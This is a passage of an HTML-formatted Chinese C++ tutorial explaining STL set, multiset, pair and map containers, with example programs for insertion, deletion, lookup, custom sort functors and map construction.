endl;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//交换</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test02</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	set&lt;<span class="type">int</span>&gt; s1;</span><br><span class="line"></span><br><span class="line">	s<span class="number">1.</span><span class="built_in">insert</span>(<span class="number">10</span>);</span><br><span class="line">	s<span class="number">1.</span><span class="built_in">insert</span>(<span class="number">30</span>);</span><br><span class="line">	s<span class="number">1.</span><span class="built_in">insert</span>(<span class="number">20</span>);</span><br><span class="line">	s<span class="number">1.</span><span class="built_in">insert</span>(<span class="number">40</span>);</span><br><span class="line"></span><br><span class="line">	set&lt;<span class="type">int</span>&gt; s2;</span><br><span class="line"></span><br><span class="line">	s<span class="number">2.</span><span class="built_in">insert</span>(<span class="number">100</span>);</span><br><span class="line">	s<span class="number">2.</span><span class="built_in">insert</span>(<span class="number">300</span>);</span><br><span class="line">	s<span class="number">2.</span><span class="built_in">insert</span>(<span class="number">200</span>);</span><br><span class="line">	s<span class="number">2.</span><span class="built_in">insert</span>(<span class="number">400</span>);</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;交换前&quot;</span> &lt;&lt; endl;</span><br><span class="line">	<span class="built_in">printSet</span>(s1);</span><br><span class="line">	<span class="built_in">printSet</span>(s2);</span><br><span class="line">	cout &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;交换后&quot;</span> &lt;&lt; endl;</span><br><span class="line">	s<span class="number">1.</span><span class="built_in">swap</span>(s2);</span><br><span class="line">	<span class="built_in">printSet</span>(s1);</span><br><span class="line">	<span class="built_in">printSet</span>(s2);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//test01();</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">test02</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>总结：</p>
<ul>
<li>统计大小   — size</li>
<li>判断是否为空   — empty</li>
<li>交换容器   — swap</li>
</ul>
<h4 id="3-8-4-set插入和删除"><a href="#3-8-4-set插入和删除" class="headerlink" title="3.8.4 set插入和删除"></a>3.8.4 set插入和删除</h4><p><strong>功能描述：</strong></p>
<ul>
<li>set容器进行插入数据和删除数据</li>
</ul>
<p><strong>函数原型：</strong></p>
<ul>
<li><code>insert(elem);</code>           &#x2F;&#x2F;在容器中插入元素。</li>
<li><code>clear();</code>                    &#x2F;&#x2F;清除所有元素</li>
<li><code>erase(pos);</code>              &#x2F;&#x2F;删除pos迭代器所指的元素，返回下一个元素的迭代器。</li>
<li><code>erase(beg, end);</code>    &#x2F;&#x2F;删除区间[beg,end)的所有元素 ，返回下一个元素的迭代器。</li>
<li><code>erase(elem);</code>            &#x2F;&#x2F;删除容器中值为elem的元素。</li>
</ul>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;set&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">printSet</span><span class="params">(set&lt;<span class="type">int</span>&gt; &amp; s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">for</span> (set&lt;<span class="type">int</span>&gt;::iterator it = s.<span class="built_in">begin</span>(); it != s.<span class="built_in">end</span>(); it++)</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; *it &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	cout &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//插入和删除</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	set&lt;<span class="type">int</span>&gt; s1;</span><br><span class="line">	<span class="comment">//插入</span></span><br><span class="line">	s<span class="number">1.</span><span class="built_in">insert</span>(<span class="number">10</span>);</span><br><span class="line">	s<span class="number">1.</span><span class="built_in">insert</span>(<span class="number">30</span>);</span><br><span class="line">	s<span class="number">1.</span><span class="built_in">insert</span>(<span class="number">20</span>);</span><br><span class="line">	s<span class="number">1.</span><span class="built_in">insert</span>(<span class="number">40</span>);</span><br><span class="line">	<span class="built_in">printSet</span>(s1);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//删除</span></span><br><span class="line">	s<span class="number">1.</span><span class="built_in">erase</span>(s<span class="number">1.</span><span class="built_in">begin</span>());</span><br><span class="line">	<span class="built_in">printSet</span>(s1);</span><br><span class="line"></span><br><span class="line">	s<span class="number">1.</span><span class="built_in">erase</span>(<span class="number">30</span>);</span><br><span class="line">	<span class="built_in">printSet</span>(s1);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//清空</span></span><br><span class="line">	<span class="comment">//s1.erase(s1.begin(), s1.end());</span></span><br><span class="line">	s<span class="number">1.</span><span class="built_in">clear</span>();</span><br><span class="line">	<span class="built_in">printSet</span>(s1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>总结：</p>
<ul>
<li>插入   — insert</li>
<li>删除   — erase</li>
<li>清空   — clear</li>
</ul>
<h4 id="3-8-5-set查找和统计"><a href="#3-8-5-set查找和统计" class="headerlink" title="3.8.5 set查找和统计"></a>3.8.5 set查找和统计</h4><p><strong>功能描述：</strong></p>
<ul>
<li>对set容器进行查找数据以及统计数据</li>
</ul>
<p><strong>函数原型：</strong></p>
<ul>
<li><code>find(key);</code>                  &#x2F;&#x2F;查找key是否存在,若存在，返回该键的元素的迭代器；若不存在，返回set.end();</li>
<li><code>count(key);</code>                &#x2F;&#x2F;统计key的元素个数</li>
</ul>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;set&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//查找和统计</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	set&lt;<span class="type">int</span>&gt; s1;</span><br><span class="line">	<span class="comment">//插入</span></span><br><span class="line">	s<span class="number">1.</span><span class="built_in">insert</span>(<span class="number">10</span>);</span><br><span class="line">	s<span class="number">1.</span><span class="built_in">insert</span>(<span class="number">30</span>);</span><br><span class="line">	s<span class="number">1.</span><span class="built_in">insert</span>(<span class="number">20</span>);</span><br><span class="line">	s<span class="number">1.</span><span class="built_in">insert</span>(<span class="number">40</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//查找</span></span><br><span class="line">	set&lt;<span class="type">int</span>&gt;::iterator pos = s<span class="number">1.f</span>ind(<span class="number">30</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (pos != s<span class="number">1.</span><span class="built_in">end</span>())</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;找到了元素 ： &quot;</span> &lt;&lt; *pos &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;未找到元素&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//统计</span></span><br><span class="line">	<span class="type">int</span> num = s<span class="number">1.</span><span class="built_in">count</span>(<span class="number">30</span>);</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;num = &quot;</span> &lt;&lt; num &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>总结：</p>
<ul>
<li>查找   —  find    （返回的是迭代器）</li>
<li>统计   —  count  （对于set，结果为0或者1）</li>
</ul>
<h4 id="3-8-6-set和multiset区别"><a href="#3-8-6-set和multiset区别" class="headerlink" title="3.8.6 set和multiset区别"></a>3.8.6 set和multiset区别</h4><p><strong>学习目标：</strong></p>
<ul>
<li>掌握set和multiset的区别</li>
</ul>
<p><strong>区别：</strong></p>
<ul>
<li>set不可以插入重复数据，而multiset可以</li>
<li>set插入数据的同时会返回插入结果，表示插入是否成功</li>
<li>multiset不会检测数据，因此可以插入重复数据</li>
</ul>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;set&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//set和multiset区别</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	set&lt;<span class="type">int</span>&gt; s;</span><br><span class="line">	pair&lt;set&lt;<span class="type">int</span>&gt;::iterator, <span class="type">bool</span>&gt;  ret = s.<span class="built_in">insert</span>(<span class="number">10</span>);</span><br><span class="line">	<span class="keyword">if</span> (ret.second) &#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;第一次插入成功!&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;第一次插入失败!&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	ret = s.<span class="built_in">insert</span>(<span class="number">10</span>);</span><br><span class="line">	<span class="keyword">if</span> (ret.second) &#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;第二次插入成功!&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;第二次插入失败!&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">    </span><br><span class="line">	<span class="comment">//multiset</span></span><br><span class="line">	multiset&lt;<span class="type">int</span>&gt; ms;</span><br><span class="line">	ms.<span class="built_in">insert</span>(<span class="number">10</span>);</span><br><span class="line">	ms.<span class="built_in">insert</span>(<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (multiset&lt;<span class="type">int</span>&gt;::iterator it = ms.<span class="built_in">begin</span>(); it != ms.<span class="built_in">end</span>(); it++) &#123;</span><br><span class="line">		cout &lt;&lt; *it &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	cout &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>总结：</p>
<ul>
<li>如果不允许插入重复数据可以利用set</li>
<li>如果需要插入重复数据利用multiset</li>
</ul>
<h4 id="3-8-7-pair对组创建"><a href="#3-8-7-pair对组创建" class="headerlink" title="3.8.7 pair对组创建"></a>3.8.7 pair对组创建</h4><p><strong>功能描述：</strong></p>
<ul>
<li>成对出现的数据，利用对组可以返回两个数据</li>
</ul>
<p><strong>两种创建方式：</strong></p>
<ul>
<li><code>pair&lt;type, type&gt; p ( value1, value2 );</code></li>
<li><code>pair&lt;type, type&gt; p = make_pair( value1, value2 );</code></li>
</ul>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//对组创建</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="function">pair&lt;string, <span class="type">int</span>&gt; <span class="title">p</span><span class="params">(string(<span class="string">&quot;Tom&quot;</span>), <span class="number">20</span>)</span></span>;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;姓名： &quot;</span> &lt;&lt;  p.first &lt;&lt; <span class="string">&quot; 年龄： &quot;</span> &lt;&lt; p.second &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	pair&lt;string, <span class="type">int</span>&gt; p2 = <span class="built_in">make_pair</span>(<span class="string">&quot;Jerry&quot;</span>, <span class="number">10</span>);</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;姓名： &quot;</span> &lt;&lt; p<span class="number">2.f</span>irst &lt;&lt; <span class="string">&quot; 年龄： &quot;</span> &lt;&lt; p<span class="number">2.</span>second &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>总结：</p>
<p>两种方式都可以创建对组，记住一种即可</p>
<h4 id="3-8-8-set容器排序"><a href="#3-8-8-set容器排序" class="headerlink" title="3.8.8 set容器排序"></a>3.8.8 set容器排序</h4><p>学习目标：</p>
<ul>
<li>set容器默认排序规则为从小到大，掌握如何改变排序规则</li>
</ul>
<p>主要技术点：</p>
<ul>
<li>利用仿函数，可以改变排序规则</li>
</ul>
<p><strong>示例一</strong>   set存放内置数据类型</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;set&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyCompare</span> </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="type">bool</span> <span class="title">operator</span><span class="params">()</span><span class="params">(<span class="type">int</span> v1, <span class="type">int</span> v2)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> v1 &gt; v2;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;    </span><br><span class="line">	set&lt;<span class="type">int</span>&gt; s1;</span><br><span class="line">	s<span class="number">1.</span><span class="built_in">insert</span>(<span class="number">10</span>);</span><br><span class="line">	s<span class="number">1.</span><span class="built_in">insert</span>(<span class="number">40</span>);</span><br><span class="line">	s<span class="number">1.</span><span class="built_in">insert</span>(<span class="number">20</span>);</span><br><span class="line">	s<span class="number">1.</span><span class="built_in">insert</span>(<span class="number">30</span>);</span><br><span class="line">	s<span class="number">1.</span><span class="built_in">insert</span>(<span class="number">50</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//默认从小到大</span></span><br><span class="line">	<span class="keyword">for</span> (set&lt;<span class="type">int</span>&gt;::iterator it = s<span class="number">1.</span><span class="built_in">begin</span>(); it != s<span class="number">1.</span><span class="built_in">end</span>(); it++) &#123;</span><br><span class="line">		cout &lt;&lt; *it &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	cout &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//指定排序规则</span></span><br><span class="line">	set&lt;<span class="type">int</span>,MyCompare&gt; s2;</span><br><span class="line">	s<span class="number">2.</span><span class="built_in">insert</span>(<span class="number">10</span>);</span><br><span class="line">	s<span class="number">2.</span><span class="built_in">insert</span>(<span class="number">40</span>);</span><br><span class="line">	s<span class="number">2.</span><span class="built_in">insert</span>(<span class="number">20</span>);</span><br><span class="line">	s<span class="number">2.</span><span class="built_in">insert</span>(<span class="number">30</span>);</span><br><span class="line">	s<span class="number">2.</span><span class="built_in">insert</span>(<span class="number">50</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (set&lt;<span class="type">int</span>, MyCompare&gt;::iterator it = s<span class="number">2.</span><span class="built_in">begin</span>(); it != s<span class="number">2.</span><span class="built_in">end</span>(); it++) &#123;</span><br><span class="line">		cout &lt;&lt; *it &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	cout &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>总结：利用仿函数可以指定set容器的排序规则</p>
<p><strong>示例二</strong> set存放自定义数据类型</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">Person</span>(string name, <span class="type">int</span> age)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">this</span>-&gt;m_Name = name;</span><br><span class="line">		<span class="keyword">this</span>-&gt;m_Age = age;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	string m_Name;</span><br><span class="line">	<span class="type">int</span> m_Age;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">comparePerson</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="type">bool</span> <span class="title">operator</span><span class="params">()</span><span class="params">(<span class="type">const</span> Person&amp; p1, <span class="type">const</span> Person &amp;p2)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="comment">//按照年龄进行排序  降序</span></span><br><span class="line">		<span class="keyword">return</span> p<span class="number">1.</span>m_Age &gt; p<span class="number">2.</span>m_Age;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	set&lt;Person, comparePerson&gt; s;</span><br><span class="line"></span><br><span class="line">	<span class="function">Person <span class="title">p1</span><span class="params">(<span class="string">&quot;刘备&quot;</span>, <span class="number">23</span>)</span></span>;</span><br><span class="line">	<span class="function">Person <span class="title">p2</span><span class="params">(<span class="string">&quot;关羽&quot;</span>, <span class="number">27</span>)</span></span>;</span><br><span class="line">	<span class="function">Person <span class="title">p3</span><span class="params">(<span class="string">&quot;张飞&quot;</span>, <span class="number">25</span>)</span></span>;</span><br><span class="line">	<span class="function">Person <span class="title">p4</span><span class="params">(<span class="string">&quot;赵云&quot;</span>, <span class="number">21</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">	s.<span class="built_in">insert</span>(p1);</span><br><span class="line">	s.<span class="built_in">insert</span>(p2);</span><br><span class="line">	s.<span class="built_in">insert</span>(p3);</span><br><span class="line">	s.<span class="built_in">insert</span>(p4);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (set&lt;Person, comparePerson&gt;::iterator it = s.<span class="built_in">begin</span>(); it != s.<span class="built_in">end</span>(); it++)</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;姓名： &quot;</span> &lt;&lt; it-&gt;m_Name &lt;&lt; <span class="string">&quot; 年龄： &quot;</span> &lt;&lt; it-&gt;m_Age &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>总结：</p>
<p>对于自定义数据类型，set必须指定排序规则才可以插入数据</p>
<h3 id="3-9-map-multimap容器"><a href="#3-9-map-multimap容器" class="headerlink" title="3.9 map&#x2F; multimap容器"></a>3.9 map&#x2F; multimap容器</h3><h4 id="3-9-1-map基本概念"><a href="#3-9-1-map基本概念" class="headerlink" title="3.9.1 map基本概念"></a>3.9.1 map基本概念</h4><p><strong>简介：</strong></p>
<ul>
<li>map中所有元素都是pair</li>
<li>pair中第一个元素为key（键值），起到索引作用，第二个元素为value（实值）</li>
<li>所有元素都会根据元素的键值自动排序</li>
</ul>
<p><strong>本质：</strong></p>
<ul>
<li>map&#x2F;multimap属于<strong>关联式容器</strong>，底层结构是用二叉树实现。</li>
</ul>
<p><strong>优点：</strong></p>
<ul>
<li>可以根据key值快速找到value值</li>
</ul>
<p>map和multimap<strong>区别</strong>：</p>
<ul>
<li>map不允许容器中有重复key值元素</li>
<li>multimap允许容器中有重复key值元素</li>
</ul>
<h4 id="3-9-2-map构造和赋值"><a href="#3-9-2-map构造和赋值" class="headerlink" title="3.9.2  map构造和赋值"></a>3.9.2  map构造和赋值</h4><p><strong>功能描述：</strong></p>
<ul>
<li>对map容器进行构造和赋值操作</li>
</ul>
<p><strong>函数原型：</strong></p>
<p><strong>构造：</strong></p>
<ul>
<li><code>map&lt;T1, T2&gt; mp;</code>                     &#x2F;&#x2F;map默认构造函数: </li>
<li><code>map(const map &amp;mp);</code>             &#x2F;&#x2F;拷贝构造函数</li>
</ul>
<p><strong>赋值：</strong></p>
<ul>
<li><code>map&amp; operator=(const map &amp;mp);</code>    &#x2F;&#x2F;重载等号操作符</li>
</ul>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;map&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">printMap</span><span class="params">(map&lt;<span class="type">int</span>,<span class="type">int</span>&gt;&amp;m)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">for</span> (map&lt;<span class="type">int</span>, <span class="type">int</span>&gt;::iterator it = m.<span class="built_in">begin</span>(); it != m.<span class="built_in">end</span>(); it++)</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;key = &quot;</span> &lt;&lt; it-&gt;first &lt;&lt; <span class="string">&quot; value = &quot;</span> &lt;&lt; it-&gt;second &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	cout &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	map&lt;<span class="type">int</span>,<span class="type">int</span>&gt;m; <span class="comment">//默认构造</span></span><br><span class="line">	m.<span class="built_in">insert</span>(<span class="built_in">pair</span>&lt;<span class="type">int</span>, <span class="type">int</span>&gt;(<span class="number">1</span>, <span class="number">10</span>));</span><br><span class="line">	m.<span class="built_in">insert</span>(<span class="built_in">pair</span>&lt;<span class="type">int</span>, <span class="type">int</span>&gt;(<span class="number">2</span>, <span class="number">20</span>));</span><br><span class="line">	m.<span class="built_in">insert</span>(<span class="built_in">pair</span>&lt;<span class="type">int</span>, <span class="type">int</span>&gt;(<span class="number">3</span>, <span class="number">30</span>));</span><br><span class="line">	<span class="built_in">printMap</span>(m);</span><br><span class="line"></span><br><span class="line">	map&lt;<span class="type">int</span>, <span class="type">int</span>&gt;<span class="built_in">m2</span>(m); <span class="comment">//拷贝构造</span></span><br><span class="line">	<span class="built_in">printMap</span>(m2);</span><br><span class="line"></span><br><span class="line">	map&lt;<span class="type">int</span>, <span class="type">int</span>&gt;m3;</span><br><span class="line">	m3 = m2; <span class="comment">//赋值</span></span><br><span class="line">	<span class="built_in">printMap</span>(m3);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>总结：map中所有元素都是成对出现，插入数据时候要使用对组</p>
<h4 id="3-9-3-map大小和交换"><a href="#3-9-3-map大小和交换" class="headerlink" title="3.9.3 map大小和交换"></a>3.9.3 map大小和交换</h4><p><strong>功能描述：</strong></p>
<ul>
<li>统计map容器大小以及交换map容器</li>
</ul>
<p>函数原型：</p>
<ul>
<li><code>size();</code>          &#x2F;&#x2F;返回容器中元素的数目</li>
<li><code>empty();</code>        &#x2F;&#x2F;判断容器是否为空</li>
<li><code>swap(st);</code>      &#x2F;&#x2F;交换两个集合容器</li>
</ul>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;map&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">printMap</span><span class="params">(map&lt;<span class="type">int</span>,<span class="type">int</span>&gt;&amp;m)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">for</span> (map&lt;<span class="type">int</span>, <span class="type">int</span>&gt;::iterator it = m.<span class="built_in">begin</span>(); it != m.<span class="built_in">end</span>(); it++)</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;key = &quot;</span> &lt;&lt; it-&gt;first &lt;&lt; <span class="string">&quot; value = &quot;</span> &lt;&lt; it-&gt;second &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	cout &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	map&lt;<span class="type">int</span>, <span class="type">int</span>&gt;m;</span><br><span class="line">	m.<span class="built_in">insert</span>(<span class="built_in">pair</span>&lt;<span class="type">int</span>, <span class="type">int</span>&gt;(<span class="number">1</span>, <span class="number">10</span>));</span><br><span class="line">	m.<span class="built_in">insert</span>(<span class="built_in">pair</span>&lt;<span class="type">int</span>, <span class="type">int</span>&gt;(<span class="number">2</span>, <span class="number">20</span>));</span><br><span class="line">	m.<span class="built_in">insert</span>(<span class="built_in">pair</span>&lt;<span class="type">int</span>, <span class="type">int</span>&gt;(<span class="number">3</span>, <span class="number">30</span>));</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (m.<span class="built_in">empty</span>())</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;m为空&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;m不为空&quot;</span> &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;m的大小为： &quot;</span> &lt;&lt; m.<span class="built_in">size</span>() &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span 